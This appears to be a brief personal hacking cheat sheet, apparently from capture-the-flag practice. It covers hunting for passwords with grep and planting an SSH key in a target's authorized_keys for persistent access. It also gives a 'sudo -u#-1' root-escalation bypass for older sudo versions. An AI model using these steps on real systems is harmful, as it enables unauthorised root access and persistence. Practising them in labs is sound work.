# interesting commands

```
echo LinEnum.sh | base64 |xclip -selection clipboard
grep -R password file_name
grep password . -B1 : get also the element before.
grep passwd /var/log/auth.log : permet de savoir la date de changement des mots de pass

```
if in the target system there is .ssh folder,I can generate my pub,priv key with **keygen -f name** and copy my public key and paste it inside .ssh (authorized_keys) ====>>> then I can connect with my private key: **ssh -i privkey user@targetip**.

```
scp -i privatekey user@targetip:/home/user.txt . : transfert user.txt to my local directory
```
## sudo abusing
```
vi visudo : to open the file listed with sudo -l
if in the file there is: user  ALL=(ALL,!root) ALL
I can run any commande with root priviledge like this: sudo -u#-1 /bin/bash  => BOOM,root access
ALso: user  ALL=(ALL,!abdo) ALL, I can have root access: sudo -u#-1 /bin/bash
bug fixed in 1.8.28  => get your current version $ sudo -V
```
